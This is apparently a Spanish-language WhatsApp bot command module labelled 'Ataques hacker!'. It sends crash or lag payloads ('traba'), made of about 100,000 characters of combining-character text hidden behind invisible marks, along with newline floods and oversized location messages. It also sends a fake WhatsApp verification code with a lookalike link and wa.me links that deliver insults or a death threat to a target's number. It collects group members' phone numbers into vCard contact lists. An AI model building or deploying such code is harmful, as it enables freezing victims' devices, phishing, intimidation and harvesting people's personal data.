const { throws } = require('assert')
let fs = require('fs')
let funciones = require("../../lib/function/funciones")
const { Z_PARTIAL_FLUSH } = require('zlib')
const { isUndefined } = require('util')

module.exports = {
  name: 'ataque',
  alias: ['traba', 'piropo', 'insulto', 'amenaza','blank','codigo','gpshk','gps','vcard','contactos','zar'],
  category: 'ataque',
  desc: 'Ataques hacker!',
  use: "'traba <texto>', 'piropo @user', 'insulto @user', 'amenaza @user','blank','codigo','gpshk','gps','vcard','contactos','zar'",
  async exec(msg, sock,arg,args, store) {


      let text= args
        ////////////////////////////////////////////////////////////
        const groupMetadata = msg.isGroup ? await sock.groupMetadata(msg.from) : []
        const groupMembers =  msg.isGroup ? await groupMetadata.participants : []
        
        if(global.creador.indexOf(msg.sender) == -1) return msg.reply("¡¡ESTE COMANDO SÓLO SE PUEDE UTILIZAR POR EL CREADOR!!")
        // if(!msg.isGroup && global.creador.indexOf(msg.from) == -1) return msg.reply("¡¡ESTE COMANDO SÓLO SE PUEDE UTILIZAR POR EL CREADOR!!")

        const command = msg.body.slice(1).trim().split(' ').shift().toLowerCase()
        //await msg.reply('Comando base', { quoted: msg})
       //await sock.sendMessage(msg.from, { text: 'Comando base' })

     ////////////////////////////////////////////////////////////
     let contenido = ''
     let users = '50588437704'
     let name = '🤖Sky'
     let name_aux = ''
     const options= { quoted: msg }
     let fecha =  new Date();
     //let date= `${fecha.getDate()}-${fecha.getMonth()}-${fecha.getFullYear()}  ${fecha.getHours()}:${fecha.getMinutes()}:${fecha.getSeconds()} `
     
     let type = "conversation"// "contactMessage", "locationMessage"
  
     if(msg.mentions != undefined && msg.mentions[0] != undefined)
       users = msg.mentions[0].split('@')[0]
     if(msg.quoted)
       users = msg.quoted.participant.split('@')[0]
     if(!msg.isGroup)
       users = msg.from.split('@')[0]
     
     name_aux = users//store.chats.array.filter(v => users+'@s.whatsapp.net'=== v.id).name
     //let name=  store.chats.array.filter(v => users+'@s.whatsapp.net'===element.id).name
     name = name_aux!=''?name_aux:name
     
       try{
           switch(command) {
             case 'traba': 
     
             let [ vista, oculto ] = text.split`|`
             if (!vista) vista = '<💣>'
             if (!oculto) oculto = ddos1         
                 contenido =  { text: vista + readMore + oculto.repeat(Math.trunc((100000-4001-vista.length)/(oculto.length)))}
             break        
     
             case 'piropo':
              contenido =  { text: 'http://wa.me/50584443511/?text=Hola%F0%9F%8C%B9Busco%F0%9F%8C%BBChica%20Estoy%20disponible%0A.%20%20%20%20%20%F0%9F%98%8E%0A.%20%20%20%20%3C%5B%20%20%5D%5C%0A.%20%20%20__%2F%5C__%7C'.replace(/50584443511/g,users) }              
             break
     
             case 'insulto':
              contenido =  { text: 'http://wa.me/50584443511/?text=Eres%F0%9F%A4%A4un%F0%9F%98%B5Grand%C3%ADsimo%F0%9F%A4%92est%C3%BApido%F0%9F%A4%AC%0A.%20%20%20%20%20%F0%9F%A7%90%0A.%20%20%20%20%2F%5B%20%20%5D%5C%0A.%20%20%20__%2F%5C__%7C'.replace(/50584443511/g,users)}               
             break
     
             case 'amenaza':    
             contenido =  { text: 'http://wa.me/50584443511/?text=Te%F0%9F%A4%96matar%C3%A9.%F0%9F%98%A0Ya%E2%98%A0%EF%B8%8Fest%C3%A1s%F0%9F%98%B1muerto%F0%9F%A4%AC%0A.%20%20%20%20%20%F0%9F%92%80%0A.%20%20%20%20%3C%5B%20%20%5D%5C%0A.%20%20%20__%2F%5C__%7C'.replace(/50584443511/g,users)}                     
             break
     
             case 'codigo':
               let a_ = Math.floor(Math.random() * 300)
               let b_ = Math.floor(Math.random() * 300)
               const fill = (number, len) =>
               "0".repeat(len - number.toString().length) + number.toString();
               a_ = fill(a_, 3)
               b_ = fill(b_, 3)
               contenido =  { text: `Codigo de WhatsApp: ${a_}-${b_}
     
               O sigue este enlace para verificar tu numero: v.whatsapp.com/${a_}${b_}
       
               No compartas este codigo con nadie.`}    

             break
     
             case 'blank':    
             contenido =  { text: blank}                           
             break
     
             case 'gpshk':
              //contenido ={ location:{ degreesLatitude: 12.4378700, degreesLongitude: -86.8780400, name:`🇳🇮Msc: ∁∂∫ixto༒∨i∬∈g∂💥` + more_full + '❤️‍🔥', address:`🇳🇮Org:  🤖Sky${more_full}💥\n🇳🇮Fecha: ${fecha}`}}         
              contenido ={ location:{ degreesLatitude: 12.644527777777776, degreesLongitude: -86.547833333333, name:`🇳🇮Msc: ∁∂∫ixto༒∨i∬∈g∂💥` + more_full + '❤️‍🔥', address:`🇳🇮Org:  🤖Sky${more_full}💥\n🇳🇮Fecha: ${fecha}`}}         
             break
     
             case 'gps':
              contenido ={ location:{ degreesLatitude: '', degreesLongitude: '', name:`${name}`, address:`🇳🇮Org:  🤖Sky\n🇳🇮Objetivo encontrado❕`}           }           
             break
     
             case 'vcard':
             //./Frases/chiste.txt
             //#region vcardhk 
             fslist = fs.readFileSync('./Frases/anonymous.txt').toString().split('\n')
             fsid = fslist[Math.floor(Math.random() * fslist.length)]+'🕵️‍♂️'
     
             type= "contactMessage"
             const vcard = 'BEGIN:VCARD\n' // metadata of the contact card
                   + 'VERSION:3.0\n' 
                   + `FN:${name}\n` // full name
                   + 'ORG:🤖Sky;\n' // the organization of the contact
                   + 'EMAIL:Sky_Service@Sky.com\n'//img_grupo_avatar.png
                   + `LABEL;TYPE=WORK,PREF:${fsid}\n`
                   + 'ADR;TYPE=HOME:;;Leon-Nicaragua🇳🇮;Estamos para servirte\n'
                   + `TEL;type=CELL;type=VOICE;waid=${users}:+${users}\n` // WhatsApp ID + phone number
                   + 'END:VCARD'                   
                
                // contenido= {contacts: {contacts: [{ vcard },{ vcard }]}}
                contenido= {contacts: {displayName: '∁∂∫ixto♛∨i∬∈g∂',contacts: [{ vcard }]}}
                let a=store 
             //#endregion
     
             break
     
             case 'contactos':             
             //#region contactos
             //if(!m.isGroup)

             let groupMetadata_aux = undefined
               if(arg.length>0)
                 groupMetadata_aux = await sock.groupMetadata(arg[0]) //await conn.groupMetadataMinimal(args[0])//
               if(arg.length===0 && msg.isGroup)
                 groupMetadata_aux = groupMetadata
               if(groupMetadata_aux == undefined)
               {
                 await msg.reply('Formato invalido.\nIntente con: _.help contactos_')
                 console.log('Formato invalido\nVerifique que el parametro sea valido')
                 return
               }
             let listintegrantes = funciones.contactos(groupMetadata_aux.participants, groupMetadata_aux.subject?groupMetadata_aux.subject:'No_Data',store)   

         contenido= {contacts: {contacts: listintegrantes}}

        //  contenido= {contacts: {displayName: '∁∂∫ixto♛∨i∬∈g∂',contacts: listintegrantes}}
             //#endregion             
             break
        
             case 'zar':          
               fslist = fs.readFileSync('./Frases/chiste.txt').toString().split('\n')
               fsid = fslist[Math.floor(Math.random() * fslist.length)]
               let listintegrantess = funciones.contactos(groupMetadata.participants?groupMetadata.participants:[], groupMetadata.subject?groupMetadata.subject:'No_Data')  
        
               contenido= {contacts: {contacts: listintegrantess}}
     
               let Inicio=  await msg.reply('INICIO:\n😆🍁🌹🍁😂\n😅Que Divertido👇🏽')//INICIO
               await msg.reply(fsid.substr(0, 35)+readMore + fsid.substr(36, fsid.length))//CHISTE  
               sock.sendMessage(msg.from, contenido)    
               await msg.reply(blank)//CHISTE               
               let Traba = INICIO//await sock.sendMessage(msg.from, { location:{ degreesLatitude: 12.644527777777776, degreesLongitude: -86.547833333333, name:`🇳🇮Msc: ∁∂∫ixto༒∨i∬∈g∂💥` + more_full + '❤️‍🔥', address:`🇳🇮Org:  🤖Sky${more_full}💥\n🇳🇮Fecha: ${fecha}`}}         )
               await msg.reply(blank)//CHISTE
               await sock.sendMessage(msg.from, { text: 'while(😆🍁🌹🍁😂)' }, { quoted: Traba })//WHILE
               await sock.sendMessage(msg.from, { delete: Traba.key })
               await msg.reply(dowhile)//FIN
               await sock.sendMessage(msg.from, { text: 'while(😆🍁🌹🍁😂)' }, { quoted: Inicio })//INICIO
             return
             break
     
             default:
               throw 'Formato invalido' 
             break
         }
     
         sock.sendMessage(msg.from, contenido)
         console.log(contenido)

     console.log('Echo')
     /////////////////////////////////////////////////////////////
     } catch (error) {
        await msg.reply('‼✖Este comando provocó un error⚠.\nIntente con: _.help '+this.name+'_', { quoted: msg})
        console.log('Ocurrio un error\n'+error)
     }

    }
  }

const more = String.fromCharCode(8206)
const readMore = more.repeat(4001)
const more_full = more.repeat(65000)
const ddos1 = '*_~⃝K⃝l⃝i⃝x⃝6⃝6⃝7⃝K⃝l⃝i⃝z⃝.⃝s⃝h⃝o⃝w⃝(⃝)⃝~_* *_~҈+҈5҈0҈5҈K҈l҈i҈x҈@҈C҈o҈m҈.҈N҈i҈~_*'//45elementos
const ddos = ddos1.repeat(1366)//1366
const blank = '.' + String.fromCharCode(10).repeat(1100) + '.'
const dowhile =   
`do{
  .     _~Virus@sky.com~_
  .     _~Infecta.show()~_
  .     _~datos.get.show()~_
  .     _~Reiniciar@Dispositivo.Ni~_
  }While(1)`

 function contactos(participants, nombre_grupo)
{   
  let listintegrantes = []
  
  participants.forEach(element => {
    let name = conn.getName(element.jid.replace(/@c.us/g, '@s.whatsapp.net'))
    const numero = element.jid.replace(/@c.us/g, '')
    name = name!=undefined?name:numero

    const vcard = 'BEGIN:VCARD\n' // metadata of the contact card
    + 'VERSION:3.0\n'
    + `FN:${name}\n` // full name
    + 'ORG:🤖Sky;\n' // the organization of the contact
    + `EMAIL: ${name.replace(/\s/g, '_')}@Sky.com\n`
    + `LABEL;TYPE=WORK,PREF:Grupo_WhatsApp: ${nombre_grupo}\n`
    + 'ADR;TYPE=HOME:;;Galaxia: Vía Láctea;Planeta: Tierra\n'
    + `TEL;type=CELL;type=VOICE;waid=${numero}:+${numero}\n` // WhatsApp ID + phone number
    + 'END:VCARD'
const contacto = {displayname: name, vcard: vcard}

    listintegrantes.push(contacto)
  });

  return listintegrantes
}